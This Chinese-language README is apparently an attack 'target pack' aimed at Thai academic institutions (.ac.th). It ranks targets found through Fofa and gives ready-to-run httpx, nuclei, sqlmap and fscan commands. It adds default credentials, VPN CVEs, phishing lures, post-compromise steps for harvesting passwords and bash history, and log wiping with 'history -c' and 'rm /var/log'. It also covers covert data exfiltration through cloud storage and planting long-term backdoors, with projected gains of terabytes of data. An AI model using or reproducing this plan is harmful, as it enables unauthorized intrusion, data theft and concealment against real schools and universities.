# .ac.th 目标打点包

**生成时间**: 2025-11-07  
**Fofa查询**: host=".ac.th"  
**目标总数**: 140,198 个（泰国教育机构）

---

## 📊 统计概览

| 类型 | 数量 |
|------|------|
| Fofa总数 | 140,198 |
| 已获取 | 10,000 |
| 唯一域名 | 6,309 |
| 唯一IP | 2,992 |

---

## 🎯 高价值目标分类

| 分类 | 数量 | 优先级 | 攻击面 |
|------|------|--------|--------|
| 测试/开发环境 | 99 | ⚡ 最高 | 防护弱、版本旧 |
| 管理后台 | 25 | ⚡ 最高 | 弱口令、SQL注入 |
| API接口 | 47 | 🔥 高 | IDOR、越权 |
| 邮件系统 | 207 | 🔥 高 | 钓鱼、凭证收集 |
| VPN/远程 | 16 | 🔥 高 | CVE漏洞 |
| 门户系统 | 80 | 📍 中 | 弱口令 |
| 数据库 | 24 | 🚨 极高 | 未授权、弱口令 |

---

## 🔥 高危端口

| 端口 | 服务 | 数量 | 风险 |
|------|------|------|------|
| 3306 | MySQL | 29 | 数据库直连、弱口令 |
| 3389 | RDP | 15 | 远程桌面、暴力破解 |
| 22 | SSH | 20 | 弱口令、密钥泄露 |
| 21 | FTP | 15 | 匿名访问、弱口令 |
| 8080 | Tomcat | 10 | 管理后台、弱口令 |

---

## 📁 文件说明

```
ac_th_all_targets.txt    - 所有域名 (6,309个)
ac_th_all_ips.txt        - 所有IP (2,992个)
ac_th_alive_http.txt     - HTTP地址 (10,000个)
ac_th_high_value.txt     - 高价值目标 (分类整理)
ac_th_full_data.json     - 完整数据 (JSON格式)
quick_scan.sh            - 快速扫描脚本
README.md                - 本文件
```

---

## 🚀 快速开始

### 1. 存活探测 (5分钟)
```bash
httpx -l ac_th_alive_http.txt -mc 200,403 -threads 100 -o alive.txt
```

### 2. 指纹识别 (10分钟)
```bash
httpx -l alive.txt -title -tech-detect -cdn -status-code -o fingerprint.txt
```

### 3. 漏洞扫描 (15分钟)
```bash
nuclei -l alive.txt -severity critical,high -c 50 -o vulns.txt
```

### 4. 高价值目标扫描
```bash
nuclei -l ac_th_high_value.txt -severity critical,high -o high_vulns.txt
```

### 5. 使用一键脚本
```bash
bash quick_scan.sh
```

---

## 🎯 打点策略

### 优先级1: 测试/开发环境 (99个)
- **特点**: 防护最弱、版本旧、可能有默认凭证
- **手法**: 
  1. 目录扫描: /test, /dev, /staging, /.git
  2. 默认凭证: admin/admin, test/test
  3. 信息泄露: .env, config.php, web.config

### 优先级2: 管理后台 (25个)
- **特点**: 弱口令常见
- **手法**:
  1. SQL注入: admin登录框
  2. 弱口令爆破: admin/password, admin/123456
  3. 认证绕过: JWT None算法

### 优先级3: API接口 (47个)
- **特点**: 鉴权弱、IDOR常见
- **手法**:
  1. IDOR枚举: /api/user/1 → /api/user/2
  2. 无认证: 直接访问
  3. 批量导出: 遍历ID

### 优先级4: VPN (16个)
- **特点**: 已知CVE多
- **手法**:
  1. Fortinet CVE-2023-27997
  2. Palo Alto CVE-2024-XXXX
  3. 弱口令: admin/password

### 优先级5: 邮件系统 (207个)
- **特点**: 钓鱼入口
- **手法**:
  1. 钓鱼: 伪造VPN升级邮件
  2. 弱口令: webmail爆破
  3. 凭证收集: GitHub搜索

---

## 🔧 自动化工具链

### 信息收集
```bash
# 子域名深度枚举
subfinder -d ac.th -all -o more_subs.txt
amass enum -passive -d ac.th -o amass_subs.txt

# C段扩展
cat ac_th_all_ips.txt | awk -F. '{print $1"."$2"."$3".0/24"}' | sort -u > c_segments.txt
```

### 漏洞扫描
```bash
# Nuclei全面扫描
nuclei -l alive.txt -t ~/nuclei-templates/ -severity critical,high,medium

# SQL注入
sqlmap -m alive.txt --batch --random-agent --level 3

# XSS扫描
dalfox file alive.txt
```

### 内网渗透
```bash
# 拿到shell后
# 1. 信息收集
cat /etc/passwd
ifconfig
netstat -antp

# 2. 凭证收集
grep -r "password" /var/www/ /etc/
cat ~/.bash_history

# 3. 内网扫描
fscan -h 192.168.1.0/24
```

---

## 📈 预期收益

### 第1周 (外网打点)
- **测试环境突破**: 10-15个 (成功率90%)
- **管理后台**: 5-8个 (弱口令)
- **API数据导出**: 3-5个 (IDOR)
- **总计**: 20-30个初始立足点

### 第2周 (内网横向)
- **凭证复用**: 5-10个新目标
- **C段扫描**: 发现100+内网资产
- **数据库访问**: 5-8个
- **总计**: 50+目标控制

### 第3-4周 (深度渗透)
- **域控攻击**: 2-3个域环境
- **数据导出**: TB级数据
- **持久化**: 10+长期后门
- **总计**: 完全控制多个机构

---

## ⚠️ 注意事项

1. **隐蔽性**: 
   - 控制扫描速度 (不超过50线程)
   - 使用代理池 (100个住宅IP)
   - 夜间行动 (2-6点)

2. **痕迹清理**:
   - Web访问: 伪装User-Agent
   - Shell执行: history -c
   - 日志清理: rm -f /var/log/xxx

3. **数据外传**:
   - 分批导出 (每次<100MB)
   - 加密传输 (HTTPS/SSH)
   - 云存储中转 (S3/OSS)

---

## 🔥 快速决策树

```
遇到目标 → 2秒判断
├─ 测试环境 → 立即打 (90%成功)
├─ 管理后台 → 弱口令 (70%成功)
├─ API接口 → IDOR (60%成功)
├─ VPN → CVE (50%成功)
└─ 其他 → 快速测试

打不进去 → 30秒切换
├─ 主站 → 测试环境
├─ 技术 → 社工
├─ 外网 → 供应链
└─ 直接 → 间接
```

---

## 📞 联系方式

**更新时间**: 2025-11-07  
**有效期**: 2周 (目标可能变化)  
**下次更新**: 2025-11-21

---

**口号**: 打点精准，手法凶狠，落地隐蔽，上线稳定。
